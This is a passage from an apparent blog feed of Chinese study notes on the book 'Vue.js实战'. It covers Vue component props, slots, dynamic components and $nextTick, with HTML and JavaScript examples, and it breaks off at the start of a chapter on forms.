title="2.组件数据的使用"></a>2.组件数据的使用</h3><p>三个组件都能实现自增,但是数据互不影响</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">my-component2</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">my-component2</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">my-component2</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">my-component2</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">my-component2</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">my-component2</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>   <br>     Vue.component(&#x27;my-component2&#x27;,&#123;<br>           template:&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Counter:<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;count++&quot;</span>&gt;</span>+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#x27;,<br>           data:function()&#123;<br>               return&#123;<br>                   count:0<br>               &#125; <br>           &#125;<br>       &#125;);<br></code></pre></td></tr></table></figure><ol start="3"><li><h3 id="使用props传递数据"><a href="#使用props传递数据" class="headerlink" title="使用props传递数据"></a>使用props传递数据</h3><p>​    1.组件除了复用以外，更重要的是组件之间的通信；props中声明的数据与组件data函数return的数据主要区别是props的来自父级，而data中的组件是自己的数据，作用域是组件本身；这两种数据都可以在template、computed和methods中使用；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">my-component3</span> <span class="hljs-attr">message</span>=<span class="hljs-string">&quot;来自父组件的数据！！&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">my-component3</span>&gt;</span><br><br><br>       Vue.component(&#x27;my-component3&#x27;, &#123;<br>           props: [&#x27;message&#x27;],<br>           template: &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#x27;<br>       &#125;);<br></code></pre></td></tr></table></figure><p>​    2.小细节</p></li></ol><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&lt;my-component2 message=<span class="hljs-string">&quot;[1,2,3]&quot;</span>&gt;&lt;/my-component2&gt;   //messgae.length=<span class="hljs-number">7</span><br>&lt;my-component2 <span class="hljs-symbol">:message=<span class="hljs-string">&quot;[1,2,3]&quot;</span>&gt;&lt;/my-component2&gt;</span>//messgae.length=<span class="hljs-number">3</span> 数组长度<br></code></pre></td></tr></table></figure><p>​         3.单向数据流：父级-&gt;子级，解耦，避免子级操作父级数据；若props作为需要抓变得原始值，可以用计算属性；</p><p>​         4.数据验证</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;data-validator&#x27;</span>,&#123;<br>          <span class="hljs-attr">props</span>:&#123;<br>              <span class="hljs-attr">propA</span>:<span class="hljs-title class_">Number</span>,<br>              <span class="hljs-attr">propB</span>:[<span class="hljs-title class_">String</span>,<span class="hljs-title class_">Number</span>],<br>              <span class="hljs-attr">propC</span>:&#123;<br>                  <span class="hljs-attr">type</span>:<span class="hljs-title class_">Boolean</span>,<br>                  <span class="hljs-attr">default</span>:<span class="hljs-literal">true</span><br>              &#125;,<br>              <span class="hljs-attr">propD</span>:&#123;<br>                  <span class="hljs-attr">type</span>:<span class="hljs-title class_">Number</span>,<br>                  <span class="hljs-attr">required</span>:<span class="hljs-literal">true</span><br>              &#125;,<br>              <span class="hljs-attr">propE</span>:&#123;<br>                  <span class="hljs-attr">type</span>:<span class="hljs-title class_">Array</span>,<br>                  <span class="hljs-attr">dafault</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                      <span class="hljs-keyword">return</span> [];<br>                  &#125;,<br>              <span class="hljs-comment">//自定义验证器</span><br>              <span class="hljs-attr">propF</span>:&#123;<br>                  <span class="hljs-attr">validator</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>)&#123;<br>                      <span class="hljs-keyword">return</span> value&gt;<span class="hljs-number">10</span>;<br>                  &#125;<br>              &#125;<br>              &#125;<br>          &#125;<br>      &#125;);<br></code></pre></td></tr></table></figure><p>4.组件通信</p><p>​    1.自定义事件：子组件向父组件传递数据</p><p>​    2.双向绑定的v-model组件需要满足下面两个要求：</p><p>​                *接受一个value属性</p><pre><code class="hljs">           *在有新的value前出发input事件</code></pre><p>​    3.使用中央时间总线Bus实现父子，兄弟，跨级的组件间通信</p><p>​    4.父链 this.$parent   this.$children  尽管Vue允许这样的操作，业务中，子组件应该尽可能避免以来父组件的数据（解耦？？）建议使用props和$emit</p><p>​    5.子组件索引：通过$refs来获取子组件实现（注意：$refs只在组件渲染完成之后才填充，并且他是非响应式的。仅仅作为一个应急方案，应当避免再模板和计算属性中使用$refs）</p><h3 id="4-使用slot分发内容"><a href="#4-使用slot分发内容" class="headerlink" title="4.使用slot分发内容"></a>4.使用slot分发内容</h3><p>当需要让组件组合使用，混合父组件的内容和子组件的模板时，用到slot，成为内容分发；</p><p>props传递数据，events触发事件，slot内容分发构成了Vue组建的3个API来源；</p><p>​    1.作用域</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">child-component</span>&gt;</span><br>&#123;&#123; message &#125;&#125;  //绑定父组件的数据<br><span class="hljs-tag">&lt;/<span class="hljs-name">child-component</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">child-component</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;showMe&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child-component</span>&gt;</span> //绑定的是父组件<br><br>var app=new Vue(&#123;<br>    el:&quot;#app&quot;,<br>    data:&#123;<br>    showMe: True;<br>&#125;<br>&#125;);<br><br><span class="hljs-tag">&lt;<span class="hljs-name">child-component</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;showMe&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child-component</span>&gt;</span> //绑定的是子组件<br><br>Vue.component(&#x27;child-component&#x27;,&#123;<br>template:&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;showMe&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#x27;,<br>data:function()&#123;<br>retunr &#123;<br>showMe:True<br>&#125;<br>&#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>​    2.slot用法</p><p>​                单个slot</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">child-component</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child-component</span>&gt;</span><br><br>       <span class="hljs-tag">&lt;<span class="hljs-name">child-component</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Car~~<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">child-component</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">       Vue.component(&#x27;child-component&#x27;, &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">           template: &quot;\</span></span><br><span class="language-xml"><span class="language-handlebars">           <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">               <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                   <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>您的购物车空空如也！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">               <span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">           <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&quot;,</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">       &#125;);</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">       var app = new Vue(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">           el: &quot;#app&quot;,</span></span><br><span class="language-xml"><span class="language-handlebars">       &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars">   </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​                具名slot和单个slot混用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">child-component</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span>此去经年<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>从前车马很慢，书信很慢，一生只够爱一个人。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span>Writted By GuiGui<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">child-component</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">        Vue.component(&#x27;child-component&#x27;, &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            template: &#x27;\</span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;main&quot;</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\</span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;);</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br></code></pre></td></tr></table></figure><p>​    3.作用域插槽：使用一个可复用的模板替代已渲染元素。？？？</p><p>​    4.访问slot：this.$slot.name;</p><h3 id="5-组件高级用法"><a href="#5-组件高级用法" class="headerlink" title="5.组件高级用法"></a>5.组件高级用法</h3><p>​    1.递归组件：组件在他的模板内递归调用自己，只要给组件设置name即可；可以用于开发具未知层级关系的独立组件；</p><p>​    注：必须设置一个条件来限制递归数量，否则抛出错误：max stack size exceeded;</p><p>​    2.内联模板：给组件标签使用inline-template特性，组件会把它的内容当作模板；</p><p>​    3.动态组件：vue.js提供了一个特殊元素&lt;component&gt;用来挂载不同的组件，使用is特性来选择需要挂载的组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">&quot;currentChoose&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;handleChangeView(&#x27;A&#x27;)&quot;</span>&gt;</span>红灯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;handleChangeView(&#x27;B&#x27;)&quot;</span>&gt;</span>黄灯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;handleChangeView(&#x27;C&#x27;)&quot;</span>&gt;</span>绿灯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">       <span class="hljs-keyword">var</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">           <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">           <span class="hljs-attr">components</span>:&#123;</span><br><span class="language-javascript">               <span class="hljs-attr">comA</span>:&#123;</span><br><span class="language-javascript">                   <span class="hljs-attr">template</span>:<span class="hljs-string">&#x27;&lt;div style=&quot;color: red;&quot;&gt;A组件&lt;/div&gt;&#x27;</span></span><br><span class="language-javascript">               &#125;,</span><br><span class="language-javascript">               <span class="hljs-attr">comB</span>:&#123;</span><br><span class="language-javascript">                   <span class="hljs-attr">template</span>:<span class="hljs-string">&#x27;&lt;div style=&quot;color: yellow;&quot;&gt;B组件&lt;/div&gt;&#x27;</span></span><br><span class="language-javascript">               &#125;,</span><br><span class="language-javascript">               <span class="hljs-attr">comC</span>:&#123;</span><br><span class="language-javascript">                   <span class="hljs-attr">template</span>:<span class="hljs-string">&#x27;&lt;div style=&quot;color: green;&quot;&gt;C组件&lt;/div&gt;&#x27;</span></span><br><span class="language-javascript">               &#125;,</span><br><span class="language-javascript">           &#125;,</span><br><span class="language-javascript">           <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">               <span class="hljs-attr">currentChoose</span>:<span class="hljs-string">&#x27;comA&#x27;</span>,</span><br><span class="language-javascript">           &#125;,</span><br><span class="language-javascript">           <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">               <span class="hljs-attr">handleChangeView</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">component</span>)&#123;</span><br><span class="language-javascript">                   <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentChoose</span>=<span class="hljs-string">&#x27;com&#x27;</span>+component;</span><br><span class="language-javascript">               &#125;,</span><br><span class="language-javascript">           &#125;,</span><br><span class="language-javascript">       &#125;)</span><br><span class="language-javascript">   </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    4.异步组件：仅仅加载需要的组件，提高性能；（vue允许将组件定义为一个工厂函数，动态的解析组件，只在组件需要渲染时触发工厂函数，并且将结果缓存，用于再次渲染）</p><h3 id="6其他"><a href="#6其他" class="headerlink" title="6其他"></a>6其他</h3><p>​    1.$nextTick 异步更新队列：vue仅仅会绘制最后一次改变，英雌因此当showtext=true的时候，其实还没有创建这个div，需要等到下一次刷新；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;div&quot;</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;showText&quot;</span>&gt;</span>This is show me text;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showMeText&quot;</span>&gt;</span>点击显示文本<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">       <span class="hljs-keyword">var</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">           <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">           <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">               <span class="hljs-attr">showText</span>: <span class="hljs-literal">false</span></span><br><span class="language-javascript">           &#125;,</span><br><span class="language-javascript">           <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">               <span class="hljs-attr">showMeText</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                   <span class="hljs-variable language_">this</span>.<span class="hljs-property">showText</span> = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript">                   <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                       <span class="hljs-keyword">var</span> text=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;div&#x27;</span>).<span class="hljs-property">innerHTML</span>;</span><br><span class="language-javascript">                       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text);</span><br><span class="language-javascript">                   &#125;);</span><br><span class="language-javascript">               &#125;</span><br><span class="language-javascript">           &#125;</span><br><span class="language-javascript">       &#125;)</span><br><span class="language-javascript">   </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    2.手动挂载实例$mount</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue.js实战（4）</title>
    <link href="/2020/11/20/Vue.js%E5%AE%9E%E6%88%98%EF%BC%884%EF%BC%89/"/>
    <url>/2020/11/20/Vue.js%E5%AE%9E%E6%88%98%EF%BC%884%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch6"><a href="#Ch6" class="headerlink" title="Ch6"></a>Ch6</h1><h3 id="6-1-表单基本用法及常用小组件"><a href="#6-1-表单基本用法及常用小组件" class="headerlink" title="6.1 表单基本用法及常用小组件"></a>6.1 表单基本用法及常用小组件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>汉语非即时显示<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;输入&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span 